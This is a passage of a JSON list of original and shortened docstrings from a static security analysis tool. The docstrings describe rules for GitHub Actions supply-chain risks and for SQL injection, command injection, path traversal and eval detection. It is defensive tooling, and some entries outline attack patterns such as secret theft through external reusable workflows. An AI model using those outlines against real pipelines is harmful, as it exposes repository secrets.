    "original": "\"\"\"Detect suspicious version specifiers in dependencies.\n\nSuspicious versions like \"latest\", \"*\", \"0.0.001\", or \"unknown\" indicate\npoor dependency management and can lead to non-reproducible builds or\nsecurity vulnerabilities.\n\nDetection Strategy:\n1. Query package_configs for all dependency versions\n2. Check against SUSPICIOUS_VERSIONS frozenset from config.py\n3. Flag any matches with appropriate severity\n\nDatabase Tables Used:\n- package_configs: Dependency version specifications\n\"\"\"",
    "truncated": "\"\"\"Detect suspicious version specifiers in dependencies.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/version_pinning.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Detect unpinned dependency versions in production code.\n\nUnpinned versions (using ^, ~, *, etc.) can lead to non-reproducible builds\nand unexpected breaking changes. Production dependencies should use exact\nversions or lock files.\n\nDetection Strategy:\n1. Query package_configs for production dependencies\n2. Check versions for range prefixes (^, ~, >, etc.)\n3. Flag unpinned versions with appropriate severity\n\nDatabase Tables Used:\n- package_configs: Dependency version specifications\n\"\"\"",
    "truncated": "\"\"\"Detect unpinned dependency versions in production code.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/artifact_poisoning.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Build finding for artifact poisoning vulnerability.\n\n    Args:\n        workflow_path: Path to workflow file\n        workflow_name: Workflow display name\n        upload_jobs: List of upload job keys\n        download_job_key: Download job key\n        dangerous_ops: List of dangerous operations found\n        permissions: Download job permissions dict\n        has_dependency: Whether download job depends on upload job\n\n    Returns:\n        StandardFinding object\n    \"\"\"",
    "truncated": "\"\"\"Build finding for artifact poisoning vulnerability.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/excessive_permissions.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Build finding for excessive permissions vulnerability.\n\n    Args:\n        workflow_path: Path to workflow file\n        workflow_name: Workflow display name\n        scope: 'workflow' or 'job'\n        job_key: Job key (if scope is job)\n        triggers: List of workflow triggers\n        dangerous_perms: List of dangerous permissions found\n        all_perms: All permissions dict\n\n    Returns:\n        StandardFinding object\n    \"\"\"",
    "truncated": "\"\"\"Build finding for excessive permissions vulnerability.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/reusable_workflow_risks.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Detect external reusable workflows with secret access.\n\n    Detection Logic:\n    1. Find jobs that use reusable workflows (uses_reusable_workflow = 1)\n    2. Check if workflow is external (different org/repo)\n    3. Check if workflow has mutable version (@main, @v1)\n    4. Report HIGH severity for supply chain risk\n\n    Args:\n        context: Rule execution context with database path\n\n    Returns:\n        List of security findings\n    \"\"\"",
    "truncated": "\"\"\"Detect external reusable workflows with secret access.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/reusable_workflow_risks.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"GitHub Actions Reusable Workflow Security Risks Detection.\n\nDetects supply chain risks where workflows call external reusable workflows with\nsecrets: inherit or extensive secret passing, allowing external organizations to\naccess repository secrets.\n\nAttack Pattern:\n1. Workflow calls reusable workflow from external org/repo\n2. Uses secrets: inherit or passes many secrets explicitly\n3. External org gains access to all repository secrets\n4. External workflow compromised = secret theft\n\nCWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\"\"\"",
    "truncated": "\"\"\"GitHub Actions Reusable Workflow Security Risks Detection.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/script_injection.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Detect script injection from untrusted PR/issue data.\n\n    Detection Logic:\n    1. Find steps with run: scripts\n    2. Check for references to untrusted github.event.* paths\n    3. Verify references are in 'run' location (not 'env' which is safer)\n    4. Report critical finding for command injection risk\n\n    Args:\n        context: Rule execution context with database path\n\n    Returns:\n        List of security findings\n    \"\"\"",
    "truncated": "\"\"\"Detect script injection from untrusted PR/issue data.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/unpinned_actions.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Detect unpinned third-party actions with secret access.\n\n    Detection Logic:\n    1. Find steps using third-party actions (not github first-party)\n    2. Check if action version is mutable (main, v1, etc.)\n    3. Check if step has access to secrets (env, with, job secrets)\n    4. Report high-severity finding for supply chain risk\n\n    Args:\n        context: Rule execution context with database path\n\n    Returns:\n        List of security findings\n    \"\"\"",
    "truncated": "\"\"\"Detect unpinned third-party actions with secret access.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/untrusted_checkout.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Detect untrusted code checkout in pull_request_target workflows.\n\n    Detection Logic:\n    1. Identify workflows triggered by pull_request_target\n    2. Find jobs with early actions/checkout steps\n    3. Check if checkout uses untrusted ref (github.event.pull_request.head.*)\n    4. Report if checkout occurs before validation job\n\n    Args:\n        context: Rule execution context with database path\n\n    Returns:\n        List of security findings\n    \"\"\"",
    "truncated": "\"\"\"Detect untrusted code checkout in pull_request_target workflows.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/untrusted_checkout.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Build finding for untrusted checkout vulnerability.\n\n    Args:\n        workflow_path: Path to workflow file\n        workflow_name: Workflow display name\n        job_key: Job key\n        step_name: Step display name\n        sequence_order: Step order in job\n        permissions: Job permissions dict\n        with_args: Checkout arguments JSON\n\n    Returns:\n        StandardFinding object\n    \"\"\"",
    "truncated": "\"\"\"Build finding for untrusted checkout vulnerability.\"\"\""
  },
  {
    "file": "theauditor/rules/node/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Extract operation target (object + first argument).\n\n        Examples:\n            ('fs.existsSync', 'filePath') → 'fs:filePath'\n            ('user.save', '') → 'user'\n            ('save', '') → ''\n\n        Args:\n            callee_function: Function being called\n            argument_expr: Argument expression string\n\n        Returns:\n            Target identifier for grouping operations\n        \"\"\"",
    "truncated": "\"\"\"Extract operation target (object + first argument).\"\"\""
  },
  {
    "file": "theauditor/rules/orm/sequelize_analyze.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Sequelize ORM Analyzer - Database-First Approach.\n\nDetects Sequelize ORM anti-patterns and performance issues using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nThis analyzer uses function_call_args table since orm_queries is not\npopulated by the standard indexer.\n\nFollows schema contract architecture (v1.1+):\n- Frozensets for all patterns (O(1) lookups)\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Proper confidence levels\n\"\"\"",
    "truncated": "\"\"\"Sequelize ORM Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_injection_analyze.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Analyze codebase for SQL injection vulnerabilities.\n\n    Detects:\n    - Dynamic SQL query construction with string concatenation\n    - Template literal SQL queries with interpolation\n    - Raw SQL execution without parameterization\n    - User input directly in SQL queries\n\n    Args:\n        context: Rule execution context\n\n    Returns:\n        List of SQL injection findings\n    \"\"\"",
    "truncated": "\"\"\"Analyze codebase for SQL injection vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/reactivity_analyze.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Detect Vue.js reactivity and props mutation issues using database queries.\n\n    Database-First Approach:\n    - Query vue_components table for props definitions (indexer extracted this)\n    - Join with assignments table to find props mutations\n    - NO manual AST traversal (violates gold standard)\n\n    Args:\n        context: StandardRuleContext with database path\n\n    Returns:\n        List of Vue reactivity findings\n    \"\"\"",
    "truncated": "\"\"\"Detect Vue.js reactivity and props mutation issues using database queries.\"\"\""
  },
  {
    "file": "theauditor/sandbox_executor.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Get path to bundled Python executable.\n\n    Handles platform differences (Windows vs Unix).\n\n    Args:\n        root_path: Starting directory to search for .auditor_venv (defaults to cwd)\n\n    Returns:\n        Path to python executable\n\n    Raises:\n        RuntimeError: If .auditor_venv or python not found\n    \"\"\"",
    "truncated": "\"\"\"Get path to bundled Python executable.\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Get all access paths that flow into this access path.\n\n        BIDIRECTIONAL TRAVERSAL: Uses reverse edges for backward analysis.\n\n        The DFG now contains both forward and reverse edges:\n        - Forward: A -> B (type='assignment')\n        - Reverse: B -> A (type='assignment_reverse')\n\n        For backward traversal from B to A, we query:\n        SELECT target FROM edges WHERE source = B AND type LIKE '%_reverse'\n\n        Returns:\n            List of (predecessor_access_path, edge_type, metadata) tuples\n        \"\"\"",
    "truncated": "\"\"\"Get all access paths that flow into this access path.\"\"\""
  },
  {
    "file": "theauditor/utils/code_snippets.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Expand from start_idx to include indented block, max 15 lines.\n\n        Uses indentation-based heuristics that work across languages:\n        - Python: indentation after ':'\n        - JS/TS/Rust/Go: indentation after '{'\n        - Stops at closing braces or dedent\n\n        Args:\n            lines: List of file lines\n            start_idx: Starting line index (0-indexed)\n\n        Returns:\n            End index (0-indexed, inclusive)\n        \"\"\"",
    "truncated": "\"\"\"Expand from start_idx to include indented block, max 15 lines.\"\"\""
  },
  {
    "file": "theauditor/utils/error_handler.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Decorator that provides robust error handling with detailed logging.\n\n    This decorator:\n    1. Catches all exceptions from the wrapped command\n    2. Logs full traceback to .pf/error.log for debugging\n    3. Shows clean, user-friendly error messages in the console\n    4. Points users to the error log for detailed information\n\n    Args:\n        func: The Click command function to wrap\n\n    Returns:\n        Wrapped function with enhanced error handling\n    \"\"\"",
    "truncated": "\"\"\"Decorator that provides robust error handling with detailed logging.\"\"\""
  },
  {
    "file": "theauditor/utils/helpers.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Load and parse a JSON file.\n\n    Args:\n        file_path: Path to JSON file\n\n    Returns:\n        Parsed JSON as dictionary\n\n    Raises:\n        FileNotFoundError: If file doesn't exist\n        json.JSONDecodeError: If file contains invalid JSON\n        PermissionError: If file cannot be read\n    \"\"\"",
    "truncated": "\"\"\"Load and parse a JSON file.\"\"\""
  },
  {
    "file": "theauditor/utils/meta_findings.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Format a high-complexity function into a standard finding.\n\n    Args:\n        func_data: Function complexity dict from CFG analyzer with fields:\n                   - file: File path\n                   - function: Function name\n                   - complexity: Cyclomatic complexity score\n                   - start_line: Function start line\n                   - block_count, has_loops: Additional metrics\n\n    Returns:\n        Formatted finding dict\n    \"\"\"",
    "truncated": "\"\"\"Format a high-complexity function into a standard finding.\"\"\""
  },
  {
    "file": "theauditor/utils/meta_findings.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Format a high-churn file into a standard finding.\n\n    Args:\n        file_data: File churn dict from metadata collector with fields:\n                   - path: File path\n                   - commits_90d: Number of commits in last 90 days\n                   - unique_authors: Number of distinct authors\n                   - days_since_modified: Days since last modification\n        threshold: Minimum commits to flag (default: 50)\n\n    Returns:\n        Formatted finding dict, or None if below threshold\n    \"\"\"",
    "truncated": "\"\"\"Format a high-churn file into a standard finding.\"\"\""
  },
  {
    "file": "theauditor/utils/meta_findings.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Format a low-coverage file into a standard finding.\n\n    Args:\n        file_data: File coverage dict from metadata collector with fields:\n                   - path: File path\n                   - line_coverage_percent: Coverage percentage\n                   - lines_executed, lines_missing: Line counts\n                   - uncovered_lines: List of uncovered line numbers\n        threshold: Maximum coverage % to flag (default: 50%)\n\n    Returns:\n        Formatted finding dict, or None if above threshold\n    \"\"\"",
    "truncated": "\"\"\"Format a low-coverage file into a standard finding.\"\"\""
  },
  {
    "file": "theauditor/utils/validation_debug.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Log validation framework detection/extraction/analysis.\n\n    Args:\n        layer: Layer identifier (L1-DETECT, L2-EXTRACT, L3-TAINT)\n        message: Human-readable log message\n        data: Optional dictionary of structured data to log\n\n    Example:\n        log_validation(\"L1-DETECT\", \"Found validation framework\", {\n            \"framework\": \"zod\",\n            \"version\": \"4.1.11\",\n            \"source\": \"backend/package.json\"\n        })\n    \"\"\"",
    "truncated": "\"\"\"Log validation framework detection/extraction/analysis.\"\"\""
  },
  {
    "file": "theauditor/utils/validation_debug.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Debug logging for validation framework implementation.\n\nThis module provides debug logging specifically for tracking validation framework\ndetection, extraction, and taint analysis integration.\n\nUsage:\n    Set environment variable: THEAUDITOR_VALIDATION_DEBUG=1\n\n    from theauditor.utils.validation_debug import log_validation\n\n    log_validation(\"L1-DETECT\", \"Found zod in package.json\", {\"version\": \"4.1.11\"})\n    log_validation(\"L2-EXTRACT\", \"Extracted parseAsync call\", {\"line\": 19})\n    log_validation(\"L3-TAINT\", \"Checking sanitizer\", {\"source_line\": 10, \"sink_line\": 60})\n\"\"\"",
    "truncated": "\"\"\"Debug logging for validation framework implementation.\"\"\""
  },
  {
    "file": "theauditor/venv_install.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Extract specific package version specs from pyproject.toml optional dependencies.\n\n    Single source of truth for package versions - reads from pyproject.toml instead of hardcoding.\n    Searches both 'runtime' and 'dev' sections.\n\n    Args:\n        pyproject_path: Path to pyproject.toml\n        package_names: List of package names to extract (e.g., ['tree-sitter', 'ruff'])\n\n    Returns:\n        List of package specs in pip format (e.g., ['tree-sitter==0.25.2', 'ruff==0.14.5'])\n        Falls back to package names without versions if parsing fails.\n    \"\"\"",
    "truncated": "\"\"\"Extract specific package version specs from pyproject.toml optional dependencies.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/js_helper_templates.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Get the appropriate single-file helper script.\n\n    DEPRECATED: Single-file mode is obsolete in Phase 5. Use get_batch_helper() with 1 file instead.\n\n    Args:\n        module_type: Either \"module\" for ES modules or \"commonjs\" for CommonJS\n\n    Returns:\n        Complete JavaScript helper script as a string\n\n    Raises:\n        RuntimeError: Always raises - single-file mode removed in Phase 5\n    \"\"\"",
    "truncated": "\"\"\"Get the appropriate single-file helper script.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/advanced_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract descriptor protocol implementations (__get__, __set__, __delete__).\n\n    Returns:\n        List of descriptor protocol dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'has_get': bool,\n            'has_set': bool,\n            'has_delete': bool,\n            'is_data_descriptor': bool,  # Has __set__ or __delete__\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract descriptor protocol implementations (__get__, __set__, __delete__).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/advanced_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract attribute access protocol (__getattr__, __setattr__, __delattr__, __getattribute__).\n\n    Returns:\n        List of attribute access protocol dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'has_getattr': bool,\n            'has_setattr': bool,\n            'has_delattr': bool,\n            'has_getattribute': bool,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract attribute access protocol (__getattr__, __setattr__, __delattr__, __getattribute__).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/async_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract async generators from Python AST.\n\n    Detects:\n    - async for loops\n    - Functions with yield inside async def\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to the parser instance\n\n    Returns:\n        List of async generator records\n    \"\"\"",
    "truncated": "\"\"\"Extract async generators from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/class_feature_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract dataclass definitions.\n\n    Detects @dataclass decorator usage and field definitions.\n\n    Returns:\n        List of dataclass dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'frozen': bool,  # If frozen=True\n            'field_count': int,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract dataclass definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/class_feature_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract Enum class definitions.\n\n    Detects classes inheriting from Enum and their members.\n\n    Returns:\n        List of enum dicts:\n        {\n            'line': int,\n            'enum_name': str,\n            'enum_type': str,  # 'Enum' | 'IntEnum' | 'Flag' | 'IntFlag'\n            'member_count': int,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract Enum class definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/class_feature_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract multiple inheritance patterns.\n\n    Detects classes with more than one base class.\n\n    Returns:\n        List of multiple inheritance dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'base_count': int,\n            'base_classes': str,  # Comma-separated\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract multiple inheritance patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/class_feature_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract dunder (magic) method definitions.\n\n    Categorizes dunder methods by purpose.\n\n    Returns:\n        List of dunder method dicts:\n        {\n            'line': int,\n            'method_name': str,\n            'category': str,  # 'lifecycle' | 'representation' | 'comparison' | etc.\n            'in_class': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract dunder (magic) method definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/collection_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract dictionary method calls.\n\n    Detects all dict method usage: keys(), values(), items(), get(), update(), etc.\n\n    Returns:\n        List of dict operation dicts:\n        {\n            'line': int,\n            'operation': str,  # Method name\n            'has_default': bool,  # For get() with default\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract dictionary method calls.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/collection_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract list method calls (focusing on mutations).\n\n    Detects: append(), extend(), insert(), remove(), pop(), sort(), reverse(), etc.\n\n    Returns:\n        List of list mutation dicts:\n        {\n            'line': int,\n            'method': str,  # Method name\n            'mutates_in_place': bool,  # True if modifies list\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract list method calls (focusing on mutations).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/collection_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract builtin function usage.\n\n    Detects: len(), sum(), max(), min(), sorted(), enumerate(), zip(), map(), filter()\n\n    Returns:\n        List of builtin usage dicts:\n        {\n            'line': int,\n            'builtin': str,  # Function name\n            'has_key': bool,  # For sorted(items, key=...)\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract builtin function usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/collection_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract itertools function usage.\n\n    Detects: chain(), cycle(), combinations(), permutations(), etc.\n\n    Returns:\n        List of itertools usage dicts:\n        {\n            'line': int,\n            'function': str,  # Function name\n            'is_infinite': bool,  # True for cycle, repeat (no count)\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract itertools function usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/collection_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract functools function usage.\n\n    Detects: partial(), reduce(), lru_cache(), cached_property(), etc.\n\n    Returns:\n        List of functools usage dicts:\n        {\n            'line': int,\n            'function': str,  # Function name\n            'is_decorator': bool,  # True if used as @decorator\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract functools function usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/collection_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract collections module usage.\n\n    Detects: defaultdict, Counter, deque, OrderedDict, ChainMap, namedtuple\n\n    Returns:\n        List of collections usage dicts:\n        {\n            'line': int,\n            'collection_type': str,  # Type name\n            'default_factory': str,  # For defaultdict (if detectable)\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract collections module usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_web_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract Django Form and ModelForm definitions.\n\n    Detects:\n    - Form and ModelForm class inheritance\n    - ModelForm Meta.model associations\n    - Field count (for validation surface area)\n    - Custom clean() or clean_<field> methods (validators)\n\n    Security relevance:\n    - Form fields = input validation surface\n    - Missing clean() methods = unvalidated input\n    - ModelForm without validators = direct DB write risk\n    \"\"\"",
    "truncated": "\"\"\"Extract Django Form and ModelForm definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_web_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract Django form field definitions.\n\n    Detects:\n    - Field types (CharField, EmailField, IntegerField, etc.)\n    - required/optional (required=False keyword)\n    - max_length constraint\n    - Custom validators (clean_<fieldname> methods)\n\n    Security relevance:\n    - Fields without max_length = DoS risk (unbounded input)\n    - Optional fields without validation = incomplete sanitization\n    - Fields without custom validators = missing business logic checks\n    \"\"\"",
    "truncated": "\"\"\"Extract Django form field definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/flask_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract Flask application factory patterns.\n\n    Detects:\n    - create_app() functions\n    - Flask() instantiations\n    - app.config updates\n    - Blueprint registrations\n\n    Security relevance:\n    - Factory pattern security configuration\n    - Config source tracking (environment, file, hardcoded)\n    - Blueprint registration = attack surface\n    \"\"\"",
    "truncated": "\"\"\"Extract Flask application factory patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/security_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract authentication and authorization decorators.\n\n    Detects:\n    - @login_required\n    - @permission_required\n    - @requires_auth\n    - Custom auth decorators\n\n    Security relevance:\n    - Missing auth decorators = unauthorized access\n    - Functions without auth = attack surface\n    - Inconsistent auth patterns = security gaps\n    \"\"\"",
    "truncated": "\"\"\"Extract authentication and authorization decorators.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/security_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract password hashing operations.\n\n    Detects:\n    - bcrypt.hashpw()\n    - pbkdf2_hmac()\n    - argon2.hash()\n    - Weak hashing (md5, sha1)\n\n    Security relevance:\n    - Weak hashing = credential theft\n    - Missing salt = rainbow table attacks\n    - Hardcoded passwords = critical vulnerability\n    \"\"\"",
    "truncated": "\"\"\"Extract password hashing operations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/security_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract SQL injection vulnerability patterns.\n\n    Detects:\n    - String formatting in SQL queries\n    - f-strings in SQL\n    - % formatting in SQL\n    - .format() in SQL\n\n    Security relevance:\n    - String interpolation in SQL = SQL injection\n    - Missing parameterization = critical vulnerability\n    - User input in queries = attack vector\n    \"\"\"",
    "truncated": "\"\"\"Extract SQL injection vulnerability patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/security_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract command injection vulnerability patterns.\n\n    Detects:\n    - subprocess.call/run with shell=True\n    - os.system() calls\n    - os.popen() calls\n    - eval() on shell commands\n\n    Security relevance:\n    - shell=True with user input = command injection\n    - os.system = always vulnerable\n    - Command string concatenation = critical risk\n    \"\"\"",
    "truncated": "\"\"\"Extract command injection vulnerability patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/security_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract path traversal vulnerability patterns.\n\n    Detects:\n    - open() with user input\n    - Path concatenation with user input\n    - Missing path validation\n    - os.path.join with untrusted input\n\n    Security relevance:\n    - Unvalidated paths = arbitrary file access\n    - Path traversal (../) = directory escape\n    - Reading arbitrary files = information disclosure\n    \"\"\"",
    "truncated": "\"\"\"Extract path traversal vulnerability patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/security_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract dangerous eval/exec/compile calls.\n\n    Detects:\n    - eval() with user input\n    - exec() calls\n    - compile() calls\n    - __import__() dynamic imports\n\n    Security relevance:\n    - eval/exec = arbitrary code execution\n    - Most critical vulnerability class\n    - No safe use of eval with untrusted input\n    \"\"\"",
    "truncated": "\"\"\"Extract dangerous eval/exec/compile calls.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/security_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract JWT patterns from PyJWT library calls using AST.\n\n    NO REGEX. This uses Python AST analysis to detect JWT library usage.\n\n    Detects:\n    - jwt.encode() - Token signing\n    - jwt.decode() - Token validation\n    - Hardcoded secrets (security risk)\n    - Weak algorithms\n\n    Returns:\n        List of JWT pattern dicts with type, secret_type, and algorithm\n    \"\"\"",
    "truncated": "\"\"\"Extract JWT patterns from PyJWT library calls using AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/stdlib_pattern_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract regular expression usage (re module).\n\n    Detects re.compile(), re.match(), re.search(), re.findall(), etc.\n\n    Returns:\n        List of regex pattern dicts:\n        {\n            'line': int,\n            'operation': str,  # 'compile' | 'match' | 'search' | 'findall' | 'sub'\n            'has_flags': bool,  # If regex flags used (re.IGNORECASE, etc.)\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract regular expression usage (re module).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/stdlib_pattern_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract JSON serialization/deserialization operations.\n\n    Detects json.dumps(), json.loads(), json.dump(), json.load().\n\n    Returns:\n        List of JSON operation dicts:\n        {\n            'line': int,\n            'operation': str,  # 'dumps' | 'loads' | 'dump' | 'load'\n            'direction': str,  # 'serialize' | 'deserialize'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract JSON serialization/deserialization operations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/stdlib_pattern_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract pathlib and os.path operations.\n\n    Detects Path() usage, exists(), mkdir(), glob(), etc.\n\n    Returns:\n        List of path operation dicts:\n        {\n            'line': int,\n            'operation': str,  # Method/function name\n            'path_type': str,  # 'pathlib' | 'os.path'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract pathlib and os.path operations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/task_graphql_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract Ariadne GraphQL resolver decorators.\n\n    Ariadne patterns:\n        @query.field(\"user\")\n        def resolve_user(obj, info, id):\n            return get_user(id)\n\n        @mutation.field(\"createUser\")\n        def create_user_resolver(obj, info, name):\n            return create_user(name)\n\n    Returns resolver metadata WITHOUT field_id (correlation happens in graphql build command).\n    \"\"\"",
    "truncated": "\"\"\"Extract Ariadne GraphQL resolver decorators.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/task_graphql_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract Strawberry GraphQL resolver decorators.\n\n    Strawberry patterns:\n        @strawberry.type\n        class User:\n            name: str\n\n            @strawberry.field\n            def full_name(self) -> str:\n                return f\"{self.first_name} {self.last_name}\"\n\n    Returns resolver metadata WITHOUT field_id (correlation happens in graphql build command).\n    \"\"\"",
    "truncated": "\"\"\"Extract Strawberry GraphQL resolver decorators.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/testing_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract unittest.TestCase classes and test methods.\n\n    Detects:\n    - TestCase class inheritance\n    - setUp/tearDown methods\n    - test_* methods\n    - Assertion method usage\n\n    Security relevance:\n    - Test coverage = code quality\n    - Missing tests = potential bugs\n    - setUp without tearDown = resource leaks\n    \"\"\"",
    "truncated": "\"\"\"Extract unittest.TestCase classes and test methods.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/testing_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract Hypothesis property-based testing strategies.\n\n    Detects:\n    - @given decorators\n    - Strategy usage (st.integers, st.text, etc.)\n    - @example decorators\n    - Stateful testing classes\n\n    Security relevance:\n    - Property-based testing = edge case coverage\n    - Missing strategies = incomplete fuzzing\n    - Stateful tests = complex behavior validation\n    \"\"\"",
    "truncated": "\"\"\"Extract Hypothesis property-based testing strategies.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/validation_extractors.py",
    "line": -1,
    "original_lines": 13,
